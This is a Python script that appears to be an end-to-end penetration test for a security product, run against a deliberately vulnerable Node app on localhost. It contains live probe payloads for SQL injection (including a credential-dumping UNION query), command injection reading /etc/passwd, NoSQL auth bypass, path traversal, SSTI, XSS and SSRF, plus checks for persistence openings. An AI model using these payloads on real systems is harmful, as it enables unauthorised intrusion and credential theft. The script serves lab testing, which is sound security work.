#!/usr/bin/env python3
"""
NeuroSploit SaaS v2 - End-to-End Pentest Test
Tests full attack chain against DVNA (Damn Vulnerable Node Application)

Attack Chain:
1. Reconnaissance - Discover services, endpoints
2. Exploitation - SQL injection, command injection
3. Lateral Movement - Access internal services
4. Persistence - Attempt backdoor/persistence mechanisms
"""

import requests
import subprocess
import json
import sys
from datetime import datetime
from urllib.parse import quote

TARGET = "http://localhost:9091"
API_URL = "http://localhost:8000"

class DVNAPentest:
    def __init__(self):
        self.findings = []
        self.attack_path = []
        self.phase = ""
    
    def log(self, phase, message, severity="info"):
        icons = {"critical": "ðŸ”´", "high": "ðŸŸ ", "medium": "ðŸŸ¡", "low": "ðŸ”µ", "info": "âšª", "success": "âœ…"}
        print(f"{icons.get(severity, 'ðŸ“Œ')} [{phase}] {message}")
        
        if severity in ["critical", "high", "medium"]:
            self.findings.append({
                "phase": phase,
                "message": message,
                "severity": severity,
                "timestamp": datetime.utcnow().isoformat()
            })
    
    def add_to_path(self, node_type, name, technique):
        self.attack_path.append({
            "type": node_type,
            "name": name,
            "technique": technique
        })
    
    # =========================================================================
    # PHASE 1: RECONNAISSANCE
    # =========================================================================
    
    def phase1_recon(self):
        """Phase 1: Reconnaissance"""
        print("\n" + "=" * 70)
        print("PHASE 1: RECONNAISSANCE")
        print("=" * 70)
        self.phase = "RECON"
        
        # Test 1: Check if target is up
        try:
            r = requests.get(TARGET, timeout=10)
            if r.status_code == 200:
                self.log("RECON", f"Target {TARGET} is UP (HTTP {r.status_code})", "success")
                self.add_to_path("host", "DVNA Server", "T1595 - Active Scanning")
            else:
                self.log("RECON", f"Target returned {r.status_code}", "info")
        except Exception as e:
            self.log("RECON", f"Target unreachable: {e}", "critical")
            return False
        
        # Test 2: Discover endpoints
        common_endpoints = [
            "/", "/login", "/register", "/app", "/learn", 
            "/api", "/users", "/admin", "/debug", "/.git"
        ]
        
        discovered = []
        for endpoint in common_endpoints:
            try:
                r = requests.get(f"{TARGET}{endpoint}", timeout=5, allow_redirects=False)
                if r.status_code != 404:
                    discovered.append((endpoint, r.status_code))
                    self.log("RECON", f"Found: {endpoint} (HTTP {r.status_code})", "info")
            except:
                pass
        
        self.log("RECON", f"Discovered {len(discovered)} endpoints", "success")
        
        # Test 3: Technology fingerprinting
        try:
            r = requests.get(TARGET, timeout=5)
            headers = r.headers
            
            if "X-Powered-By" in headers:
                tech = headers["X-Powered-By"]
                self.log("RECON", f"Technology: {tech}", "medium")
                self.add_to_path("service", f"Web Server ({tech})", "T1592 - Gather Victim Host Info")
            
            if "express" in str(headers).lower() or "node" in r.text.lower():
                self.log("RECON", "Detected: Node.js/Express application", "info")
        except:
            pass
        
        # Test 4: Check for vulnerable endpoints
        vuln_indicators = ["/learn/vulnerability", "/app/usersearch", "/app/calc"]
        for endpoint in vuln_indicators:
            try:
                r = requests.get(f"{TARGET}{endpoint}", timeout=5)
                if r.status_code == 200 or r.status_code == 302:
                    self.log("RECON", f"Potential vuln endpoint: {endpoint}", "medium")
            except:
                pass
        
        return True
    
    # =========================================================================
    # PHASE 2: EXPLOITATION
    # =========================================================================
    
    def phase2_exploitation(self):
        """Phase 2: Exploitation - Test for vulnerabilities"""
        print("\n" + "=" * 70)
        print("PHASE 2: EXPLOITATION")
        print("=" * 70)
        self.phase = "EXPLOIT"
        
        exploits_successful = 0
        
        # Test 1: SQL Injection
        print("\n### Testing SQL Injection ###")
        sqli_endpoints = [
            ("/app/usersearch", "login", "' OR '1'='1"),
            ("/app/usersearch", "login", "admin'--"),
            ("/learn/vulnerability/a1_injection", "name", "' OR 1=1--")
        ]
        
        for endpoint, param, payload in sqli_endpoints:
            try:
                r = requests.get(
                    f"{TARGET}{endpoint}",
                    params={param: payload},
                    timeout=10
                )
                
                # Check for successful injection
                if any(indicator in r.text.lower() for indicator in ["admin", "user", "password", "email", "error in your sql"]):
                    self.log("SQLi", f"VULNERABLE: {endpoint} ({param})", "critical")
                    self.add_to_path("vulnerability", "SQL Injection", "T1190 - Exploit Public-Facing App")
                    exploits_successful += 1
                    break
                elif "syntax" in r.text.lower() or "sql" in r.text.lower():
                    self.log("SQLi", f"SQL error exposed at {endpoint}", "high")
                    exploits_successful += 1
                    break
            except Exception as e:
                pass
        
        # Test 2: Command Injection
        print("\n### Testing Command Injection ###")
        cmd_endpoints = [
            ("/app/calc", "eqn", "; id"),
            ("/app/calc", "eqn", "| cat /etc/passwd"),
            ("/learn/vulnerability/a1_injection", "host", "; whoami")
        ]
        
        for endpoint, param, payload in cmd_endpoints:
            try:
                r = requests.post(
                    f"{TARGET}{endpoint}",
                    data={param: payload},
                    timeout=10
                )
                
                if any(indicator in r.text for indicator in ["uid=", "root:", "www-data", "node"]):
                    self.log("CMDi", f"VULNERABLE: {endpoint} - Command executed!", "critical")
                    self.add_to_path("exploit", "Command Injection", "T1059 - Command and Scripting")
                    exploits_successful += 1
                    break
            except:
                pass
        
        # Test 3: NoSQL Injection (MongoDB)
        print("\n### Testing NoSQL Injection ###")
        nosql_payloads = [
            {"$gt": ""},
            {"$ne": "invalid"}
        ]
        
        for payload in nosql_payloads:
            try:
                r = requests.post(
                    f"{TARGET}/app/login",
                    json={"login": payload, "password": payload},
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )
                if "dashboard" in r.text.lower() or r.status_code == 302:
                    self.log("NoSQLi", "VULNERABLE: Authentication bypass via NoSQL injection", "critical")
                    self.add_to_path("exploit", "NoSQL Auth Bypass", "T1078 - Valid Accounts")
                    exploits_successful += 1
                    break
            except:
                pass
        
        # Test 4: Server-Side Template Injection (SSTI)
        print("\n### Testing SSTI ###")
        ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]
        
        for payload in ssti_payloads:
            try:
                r = requests.get(
                    f"{TARGET}/app/usersearch",
                    params={"login": payload},
                    timeout=10
                )
                if "49" in r.text:
                    self.log("SSTI", "VULNERABLE: Server-Side Template Injection", "critical")
                    self.add_to_path("exploit", "SSTI", "T1059.007 - JavaScript")
                    exploits_successful += 1
                    break
            except:
                pass
        
        # Test 5: Path Traversal
        print("\n### Testing Path Traversal ###")
        traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd"
        ]
        
        for payload in traversal_payloads:
            try:
                r = requests.get(
                    f"{TARGET}/app/file",
                    params={"name": payload},
                    timeout=10
                )
                if "root:" in r.text:
                    self.log("PathTraversal", "VULNERABLE: Local File Inclusion", "critical")
                    self.add_to_path("exploit", "LFI", "T1005 - Data from Local System")
                    exploits_successful += 1
                    break
            except:
                pass
        
        # Test 6: XSS
        print("\n### Testing XSS ###")
        xss_payload = "<script>alert('XSS')</script>"
        try:
            r = requests.get(
                f"{TARGET}/app/usersearch",
                params={"login": xss_payload},
                timeout=10
            )
            if xss_payload in r.text:
                self.log("XSS", "VULNERABLE: Reflected XSS", "high")
                self.add_to_path("vulnerability", "XSS", "T1189 - Drive-by Compromise")
                exploits_successful += 1
        except:
            pass
        
        self.log("EXPLOIT", f"Found {exploits_successful} exploitable vulnerabilities", 
                 "critical" if exploits_successful > 0 else "info")
        
        return exploits_successful > 0
    
    # =========================================================================
    # PHASE 3: POST-EXPLOITATION / LATERAL MOVEMENT
    # =========================================================================
    
    def phase3_lateral_movement(self):
        """Phase 3: Lateral Movement - Move through the system"""
        print("\n" + "=" * 70)
        print("PHASE 3: LATERAL MOVEMENT")
        print("=" * 70)
        self.phase = "LATERAL"
        
        lateral_success = False
        
        # Test 1: Access internal services (MySQL)
        print("\n### Checking Internal Services ###")
        try:
            # Check if MySQL is accessible
            result = subprocess.run(
                ["nc", "-zv", "localhost", "3306"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if "succeeded" in result.stderr.lower() or result.returncode == 0:
                self.log("LATERAL", "MySQL service detected on 3306", "medium")
                self.add_to_path("service", "MySQL Database", "T1021 - Remote Services")
        except:
            pass
        
        # Test 2: Enumerate users from previous SQLi
        print("\n### Enumerating Users ###")
        try:
            r = requests.get(
                f"{TARGET}/app/usersearch",
                params={"login": "' UNION SELECT username, password FROM users--"},
                timeout=10
            )
            if "admin" in r.text.lower() or "user" in r.text.lower():
                self.log("LATERAL", "Extracted user credentials from database", "critical")
                self.add_to_path("credential", "Database Credentials", "T1003 - Credential Dumping")
                lateral_success = True
        except:
            pass
        
        # Test 3: Check for other internal endpoints
        internal_endpoints = [
            "/internal", "/admin", "/api/internal", 
            "/debug", "/metrics", "/health"
        ]
        
        for endpoint in internal_endpoints:
            try:
                r = requests.get(f"{TARGET}{endpoint}", timeout=5)
                if r.status_code == 200:
                    self.log("LATERAL", f"Internal endpoint accessible: {endpoint}", "medium")
                    lateral_success = True
            except:
                pass
        
        # Test 4: SSRF to internal services
        print("\n### Testing SSRF ###")
        ssrf_targets = [
            "http://localhost:3306",
            "http://127.0.0.1:22",
            "http://internal-service:8080"
        ]
        
        for target in ssrf_targets:
            try:
                r = requests.get(
                    f"{TARGET}/app/redirect",
                    params={"url": target},
                    timeout=10,
                    allow_redirects=False
                )
                if r.status_code in [200, 301, 302]:
                    self.log("SSRF", f"Possible SSRF to {target}", "high")
                    self.add_to_path("pivot", "SSRF Access", "T1090 - Proxy")
                    lateral_success = True
            except:
                pass
        
        return lateral_success
    
    # =========================================================================
    # PHASE 4: PERSISTENCE
    # =========================================================================
    
    def phase4_persistence(self):
        """Phase 4: Persistence - Establish persistent access"""
        print("\n" + "=" * 70)
        print("PHASE 4: PERSISTENCE")
        print("=" * 70)
        self.phase = "PERSIST"
        
        persistence_possible = False
        
        # Test 1: Create backdoor user (simulated - don't actually create)
        print("\n### Testing User Creation ###")
        try:
            # Check if registration is open
            r = requests.get(f"{TARGET}/register", timeout=5)
            if r.status_code == 200:
                self.log("PERSIST", "User registration available - backdoor account possible", "medium")
                self.add_to_path("persistence", "Backdoor Account", "T1136 - Create Account")
                persistence_possible = True
        except:
            pass
        
        # Test 2: Check for file upload functionality
        print("\n### Testing File Upload ###")
        try:
            r = requests.get(f"{TARGET}/app/upload", timeout=5)
            if r.status_code == 200:
                self.log("PERSIST", "File upload available - webshell possible", "high")
                self.add_to_path("persistence", "Webshell Upload", "T1505.003 - Web Shell")
                persistence_possible = True
        except:
            pass
        
        # Test 3: Check for cron/scheduled task access
        print("\n### Testing Scheduled Tasks ###")
        if self.findings:  # If we have command injection
            cmd_findings = [f for f in self.findings if "CMDi" in f.get("phase", "") or "Command" in f.get("message", "")]
            if cmd_findings:
                self.log("PERSIST", "Command injection allows cron job creation", "high")
                self.add_to_path("persistence", "Scheduled Task", "T1053 - Scheduled Task/Job")
                persistence_possible = True
        
        # Test 4: Check for config file modification
        print("\n### Testing Config Access ###")
        config_files = [".env", "config.json", "package.json"]
        for config in config_files:
            try:
                r = requests.get(
                    f"{TARGET}/app/file",
                    params={"name": config},
                    timeout=5
                )
                if r.status_code == 200 and len(r.text) > 10:
                    self.log("PERSIST", f"Config file accessible: {config}", "high")
                    persistence_possible = True
            except:
                pass
        
        return persistence_possible
    
    # =========================================================================
    # GENERATE REPORT
    # =========================================================================
    
    def generate_report(self):
        """Generate attack report"""
        print("\n" + "=" * 70)
        print("ATTACK CHAIN SUMMARY")
        print("=" * 70)
        
        print("\n### Attack Path ###")
        for i, node in enumerate(self.attack_path):
            arrow = "â””â”€>" if i == len(self.attack_path) - 1 else "â”œâ”€>"
            print(f"  {arrow} [{node['type'].upper()}] {node['name']}")
            print(f"      MITRE: {node['technique']}")
        
        print("\n### Findings by Severity ###")
        severity_count = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for finding in self.findings:
            sev = finding.get("severity", "low")
            if sev in severity_count:
                severity_count[sev] += 1
        
        print(f"  ðŸ”´ Critical: {severity_count['critical']}")
        print(f"  ðŸŸ  High:     {severity_count['high']}")
        print(f"  ðŸŸ¡ Medium:   {severity_count['medium']}")
        print(f"  ðŸ”µ Low:      {severity_count['low']}")
        
        print("\n### All Findings ###")
        for finding in self.findings:
            icons = {"critical": "ðŸ”´", "high": "ðŸŸ ", "medium": "ðŸŸ¡", "low": "ðŸ”µ"}
            print(f"  {icons.get(finding['severity'], 'âšª')} {finding['message']}")
        
        return {
            "target": TARGET,
            "findings": self.findings,
            "attack_path": self.attack_path,
            "severity_summary": severity_count
        }
    
    def run(self):
        """Run full pentest"""
        print("=" * 70)
        print("NeuroSploit SaaS v2 - E2E Pentest against DVNA")
        print(f"Target: {TARGET}")
        print(f"Time: {datetime.utcnow().isoformat()}")
        print("=" * 70)
        
        # Phase 1: Recon
        if not self.phase1_recon():
            print("\nâŒ Target unreachable. Aborting.")
            return 1
        
        # Phase 2: Exploitation
        self.phase2_exploitation()
        
        # Phase 3: Lateral Movement
        self.phase3_lateral_movement()
        
        # Phase 4: Persistence
        self.phase4_persistence()
        
        # Generate Report
        report = self.generate_report()
        
        # Save report
        with open("dvna_pentest_report.json", "w") as f:
            json.dump(report, f, indent=2)
        print(f"\nðŸ“„ Report saved to: dvna_pentest_report.json")
        
        # Final status
        print("\n" + "=" * 70)
        if report["severity_summary"]["critical"] > 0:
            print("ðŸ”´ RESULT: CRITICAL VULNERABILITIES FOUND")
            print("   Platform successfully identified attack chain!")
            return 0
        elif report["severity_summary"]["high"] > 0:
            print("ðŸŸ  RESULT: HIGH SEVERITY ISSUES FOUND")
            return 0
        else:
            print("ðŸŸ¡ RESULT: Some findings discovered")
            return 0

if __name__ == "__main__":
    pentest = DVNAPentest()
    sys.exit(pentest.run())
